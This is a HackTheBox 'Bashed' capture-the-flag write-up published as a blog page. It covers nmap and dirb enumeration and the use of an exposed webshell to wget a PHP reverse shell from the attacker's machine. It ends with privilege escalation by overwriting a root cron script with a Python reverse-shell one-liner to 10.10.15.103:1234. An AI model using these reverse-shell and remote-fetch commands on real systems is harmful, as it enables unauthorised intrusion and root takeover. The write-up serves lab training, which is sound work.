@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="">
+    <head>
+         
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>HTB Bashed - Write Up</title>
+        <style>
+
+    html body {
+        font-family: '', sans-serif;
+        background-color: white;
+    }
+
+    :root {
+        --accent: green;
+        --border-width:  5px ;
+    }
+
+</style>
+
+
+<link rel="stylesheet" href="https://0x23b.github.io/css/main.css">
+
+
+
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=">
+
+
+
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+ 
+
+
+
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
+ <meta name="generator" content="Hugo 0.32.4" />
+        
+        
+        
+        
+        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-91628530-1"></script>
+        <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments)};
+          gtag('js', new Date());
+
+          gtag('config', 'UA-91628530-1');
+        </script>
+        
+    </head>
+
+    
+    <script type="text/javascript" async
+      src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+  </script>
+
+    <body>
+        
+
+        <nav class="navbar navbar-default navbar-fixed-top">
+
+            <div class="container">
+
+                <div class="navbar-header">
+
+                    <a class="navbar-brand visible-xs" href="#">HTB Bashed - Write Up</a>
+					
+                    <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+                </div>
+
+                <div class="collapse navbar-collapse">
+
+                    
+                        <ul class="nav navbar-nav">
+                            
+                                <li><a href="https://0x23b.github.io/">Home</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/about">About</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/tags/">Tags</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/posts/">Posts</a></li>
+                            
+                        </ul>
+                    
+
+                    
+                        <ul class="nav navbar-nav navbar-right">
+                            
+                                <li class="navbar-icon"><a href="https://github.com/0x23b/"><i class="fa fa-github"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://twitter.com/0x23b/"><i class="fa fa-twitter"></i></a></li>
+                            
+							<li class="navbar-icon"></li>
+
+                        </ul>
+						
+						<ul class="nav navbar-nav navbar-right">
+                        </ul>
+						
+						
+
+                    
+
+                </div>
+
+            </div>
+
+        </nav>
+
+
+<main>
+
+    <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="https://0x23b.github.io/posts/hackthebox/2018-04-28-htb_bashed_writeups/">HTB Bashed - Write Up</a></h4>
+    <h5>April 28, 2018</h5>
+    
+    <a href="https://0x23b.github.io/tags/hackthebox"><kbd class="item-tag">HackTheBox</kbd></a>
+    
+    <a href="https://0x23b.github.io/tags/writeups"><kbd class="item-tag">Writeups</kbd></a>
+    
+
+</div>
+
+
+    <br> <div class="text-justify">
+
+<p>IP: 10.10.10.68</br>
+OS: Linux</br></p>
+
+<h2 id="nmap">Nmap</h2>
+
+<pre><code class="language-bash">root@kali:~/HTB/Bashed# nmap -v -A -O -p- -oA nmap 10.10.10.68
+Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-04 10:32 EST
+Nmap scan report for 10.10.10.68
+Host is up (0.019s latency).
+Not shown: 65534 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Arrexel's Development Site
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.60%E=4%D=1/4%OT=80%CT=1%CU=39733%PV=Y%DS=2%DC=T%G=Y%TM=5A4E4937
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)OPS(
+OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
+OS:NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
+OS:R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
+OS:S)
+
+Uptime guess: 0.005 days (since Thu Jan  4 10:26:42 2018)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=261 (Good luck!)
+IP ID Sequence Generation: All zeros
+
+TRACEROUTE (using port 3306/tcp)
+HOP RTT      ADDRESS
+1   22.29 ms 10.10.14.1
+2   16.82 ms 10.10.10.68
+</code></pre>
+
+<p>There is no other service running on this machine than an Apache, so let&rsquo;s run dirb to see, what we can find on the server:</p>
+
+<h2 id="dirb">Dirb</h2>
+
+<pre><code class="language-bash">root@kali:~/HTB/Bashed# dirb http://10.10.10.68
+
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Thu Jan  4 10:36:03 2018
+URL_BASE: http://10.10.10.68/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://10.10.10.68/ ----
+==&gt; DIRECTORY: http://10.10.10.68/css/
+==&gt; DIRECTORY: http://10.10.10.68/dev/
+==&gt; DIRECTORY: http://10.10.10.68/fonts/
+==&gt; DIRECTORY: http://10.10.10.68/images/
++ http://10.10.10.68/index.html (CODE:200|SIZE:7743)
+==&gt; DIRECTORY: http://10.10.10.68/js/
+==&gt; DIRECTORY: http://10.10.10.68/php/
++ http://10.10.10.68/server-status (CODE:403|SIZE:299)
+==&gt; DIRECTORY: http://10.10.10.68/uploads/
+</code></pre>
+
+<h2 id="user-access">User access</h2>
+
+<p>Going through the folders, I found phpbash.php in the dev folder, which is basically a webshell in php. We can see, that wget is installed on the machine, so we download the php reverse shell from <a><a href="http://pentestmonkey.net/tools/php-reverse-shell">http://pentestmonkey.net/tools/php-reverse-shell</a></a> to our local machine, extract it and change ip/port to ours. To do so, we fire up</p>
+
+<pre><code class="language-bash">root@kali:~~/HTB/Bashed# python SimpleHTTPServer.py 80
+Serving HTTP on 0.0.0.0 port 80 ...
+</code></pre>
+
+<p>and download the shell via the webshell, as we are in the /var/www/html/uploads folder.</p>
+
+<pre><code class="language-bash">www-data@bashed:/var/www/html/uploads# wget http://10.10.15.103:80/shell.php
+</code></pre>
+
+<p>To catch the reverse shell, we have to start a netcat listener:</p>
+
+<pre><code class="language-bash">root@kali:~~/HTB/Bashed# nc -lvnp 1453
+listening on [any] 1453 ...
+</code></pre>
+
+<p>To trigger the reverse shell, we have to browse to <a href="http://10.10.10.68/uploads/shell.php">http://10.10.10.68/uploads/shell.php</a>. Now, after the reverse shell is triggered, we have to upgrade to a full shell with</p>
+
+<pre><code class="language-bash">$ python -c &quot;import pty; pty.spawn('/bin/bash');&quot;
+www-data@bashed:/$
+</code></pre>
+
+<h2 id="privilege-escalation">Privilege escalation</h2>
+
+<p>With sudo -l we can see, that www-data is able to execute ALL commands as scriptmanager:</p>
+
+<pre><code class="language-bash">www-data@bashed:/$ sudo -l
+Matching Defaults entries for www-data on bashed:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on bashed:
+    (scriptmanager : scriptmanager) NOPASSWD: ALL
+www-data@bashed:/$
+</code></pre>
+
+<p>For convenience, let&rsquo;s switch user to scriptmanager:</p>
+
+<pre><code class="language-bash">www-data@bashed:/$ sudo -u scriptmanager /bin/bash
+scriptmanager@bashed:/$
+</code></pre>
+
+<p>While on the / directory we can see, that there is a /scripts folder, which we can enter. We can see, that two files - test.py and test.txt - are in there, whereas test.txt has just been created by root. This means, that the test.py script is executed through a cronjob owned by root. So we launch another nc listener on port 1234, change the content of the script to the following and wait to win:</p>
+
+<pre><code class="language-bash">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.15.103&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
+</code></pre>
+</div>
+
+    
+    
+
+    
+
+    
+
+</main>
+
+        <footer>
+
+            <p class="copyright text-muted">&copy; All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a></p>
+
+        </footer>
+       
+    </body>
+
+</html>
+
